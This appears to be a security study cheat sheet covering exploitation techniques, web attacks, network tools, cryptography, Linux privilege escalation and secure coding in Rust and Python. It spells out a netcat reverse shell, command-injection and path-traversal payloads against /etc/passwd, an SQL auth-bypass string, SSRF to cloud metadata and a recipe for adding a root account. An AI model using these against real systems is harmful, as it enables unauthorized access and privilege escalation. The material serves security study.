Binary Exploitation Concepts:

Stack buffer overflow: When a program writes more data to a stack buffer than allocated, overwriting the return address. Attacker controls EIP/RIP register. Classic exploit: overwrite return address with shellcode address or ROP chain.

Return-oriented programming (ROP): Technique to bypass NX/DEP by chaining existing code gadgets (sequences ending in RET). Gadgets manipulate registers and stack to achieve arbitrary computation without injecting new code.

Format string vulnerability: When user input is passed directly as printf format string. Allows reading arbitrary memory (percent x, percent p) and writing to arbitrary addresses (percent n). Can leak stack canaries or overwrite GOT entries.

Heap exploitation: Use-after-free, double-free, heap overflow. Targets malloc metadata. Techniques: fastbin dup, tcache poisoning, unsorted bin attack, house of force, largebin attack.

ASLR bypass: Address space layout randomization randomizes base addresses. Bypassed via: information leaks, brute force (32-bit), partial overwrites, ret2plt, ret2libc using known offsets.

Web Security Concepts:

SQL Injection: Unsanitized input in SQL queries. Quote OR one equals one bypasses auth. UNION SELECT extracts data. Blind SQLi uses boolean/time-based inference. Prevention: parameterized queries, prepared statements.

Cross-site scripting (XSS): Injecting JavaScript into pages viewed by others. Reflected XSS in URL parameters. Stored XSS saved in database. DOM XSS from client-side JavaScript.

Command injection: User input passed to shell commands without sanitization. semicolon ls, pipe cat /etc/passwd, dollar sign paren id, backtick whoami. Blind: sleep, DNS, HTTP callbacks.

Path traversal: dot dot slash etc slash passwd — accessing files outside webroot. Encoded: percent 2e percent 2e percent 2f. Double-encoded. Null byte injection (legacy PHP).

SSRF: Server-side request forgery — making server fetch internal resources. Bypass: http://127.0.0.1, http://169.254.169.254 (AWS metadata).

Network Security Concepts:

Port scanning with nmap: dash sS SYN scan (stealth), dash sV version detection, dash O OS fingerprinting, dash A aggressive, dash p dash all ports. Firewall evasion: dash f fragment, dash dash source-port.

Packet analysis with tcpdump: dash i interface, dash n no DNS, dash v verbose, dash X hex+ASCII, port 80 filter, host 1.2.3.4, dash w file.pcap, dash r read.

Netcat usage: nc dash lvnp 4444 (listen), nc host port (connect), nc dash e /bin/bash host port (reverse shell), nc dash u (UDP), banner grab.

Wireshark filters: tcp.port==443, http.request, ip.addr==x.x.x.x, dns.qry.name contains evil, follow TCP stream, export objects.

Cryptography Concepts:

Symmetric encryption: AES (128/192/256 bit), modes: ECB (insecure, patterns), CBC (IV reuse attack), CTR (nonce reuse equals XOR), GCM (authenticated). DES/3DES: legacy, weak. ChaCha20-Poly1305: modern stream cipher.

Asymmetric: RSA (factoring), ECC (discrete log). Key exchange: DH, ECDH. Common attacks: small exponent, common modulus, Wiener's attack, padding oracle (PKCS#1 v1.5), timing attacks, fault injection.

Hash functions: MD5/SHA1 (broken, collision attacks), SHA-256/SHA-3 (secure). Length Extension attack on SHA-1/SHA-256 without HMAC. Rainbow tables vs salts. bcrypt/scrypt/Argon2 for password hashing — memory-hard functions.

Linux Privilege Escalation:

SUID binaries: find / -perm -4000 2>/dev/null. GTFOBins lists exploitable binaries. sudo -l shows allowed commands. Weak sudo rules exploitable.

Kernel exploits: uname -r to get version. Search CVEs. dirty cow, overlayfs, netfilter, io_uring vulnerabilities in older kernels.

Cron jobs: cat /etc/crontab, ls /etc/cron.*, check writable scripts run as root. PATH hijacking: if script calls binary without full path and PATH is writable.

Writable /etc/passwd: add root:x:0:0:root:/root:/bin/bash with openssl passwd. LD_PRELOAD: if sudo preserves env, inject malicious shared library.

Rust Security Coding:

Memory safety: Rust prevents buffer overflows, use-after-free, data races at compile time via ownership/borrowing. No null pointer dereferences (Option<T>).

Unsafe Rust: needed for FFI, raw pointer arithmetic, SIMD. Must verify: pointer validity, alignment, aliasing rules, no data races.

Cryptography in Rust: use ring, rustls, or RustCrypto crates. Never implement crypto from scratch. Use ChaCha20Poly1305 or AES-GCM for symmetric encryption.

Network programming: tokio for async, std::net for sync. TcpListener::bind, TcpStream::connect. Use BufReader for line-by-line reading. Handle EAGAIN/EINTR.

Python for Security:

subprocess module: subprocess.run with list args, never shell=True with user input — command injection risk. Use shlex.quote() if shell=True is unavoidable.

socket programming: socket.AF_INET, socket.SOCK_STREAM, connect, send, recv, close. Raw sockets require root: socket.SOCK_RAW, socket.IPPROTO_TCP.

struct module: struct.pack greater-than I, value big-endian u32. struct.unpack less-than Q, data little-endian u64. Used in binary exploitation for packing addresses.

pwntools: the standard CTF exploitation library. from pwn import * — provides remote(), process(), p64(), u64(), flat(), cyclic(), ELF(), ROP(), shellcraft, asm().

scapy: packet crafting and sniffing. from scapy.all import IP, TCP, send, sniff. IP(dst=host)/TCP(dport=80, flags=S) — SYN packet.
